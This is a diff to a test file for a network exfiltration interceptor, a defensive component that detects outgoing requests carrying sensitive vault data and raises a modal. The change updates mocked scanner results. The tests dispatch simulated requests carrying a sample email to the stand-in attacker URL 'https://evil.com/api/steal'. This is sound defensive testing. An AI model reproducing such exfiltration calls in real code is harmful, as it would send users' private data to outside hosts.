@@ -47,7 +47,7 @@ describe('NetworkExfiltrationInterceptor (Phase 2: Network-Level Interception)',
   };
 
   it('should ignore requests without sensitive data', () => {
-    vi.mocked(VaultScanner.scanTextSync).mockReturnValue({ matches: [] } as any);
+    vi.mocked(VaultScanner.scanTextSync).mockReturnValue({ triggers: [], matchedItems: [] });
 
     const wasPrevented = dispatchNetEvent('https://evil.com/api/steal', '{"data": "safe string"}');
     
@@ -57,8 +57,12 @@ describe('NetworkExfiltrationInterceptor (Phase 2: Network-Level Interception)',
 
   it('should intercept stealth exfiltration and show modal when sensitive data is detected', () => {
     vi.mocked(VaultScanner.scanTextSync).mockReturnValue({
-      matches: [{ type: 'EMAIL', value: 'secret@domain.com', label: 'Email', source: 'Vault' }]
-    } as any);
+      triggers: [],
+      matchedItems: [{
+        id: 'email-1', category: 'CUSTOM', label: 'Email', realValue: 'secret@domain.com',
+        decoyValue: '', keywords: [], createdAt: Date.now(),
+      }],
+    });
 
     const wasPrevented = dispatchNetEvent('https://evil.com/api/steal', '{"email": "secret@domain.com"}');
     
@@ -86,8 +90,12 @@ describe('NetworkExfiltrationInterceptor (Phase 2: Network-Level Interception)',
 
   it('should ignore requests to the same origin', () => {
     vi.mocked(VaultScanner.scanTextSync).mockReturnValue({
-      matches: [{ type: 'EMAIL', value: 'secret@domain.com', label: 'Email', source: 'Vault' }]
-    } as any);
+      triggers: [],
+      matchedItems: [{
+        id: 'email-1', category: 'CUSTOM', label: 'Email', realValue: 'secret@domain.com',
+        decoyValue: '', keywords: [], createdAt: Date.now(),
+      }],
+    });
 
     // Assuming tests run in localhost or about:blank, let's use window.location.origin
     const localUrl = window.location.href + '/api/save';
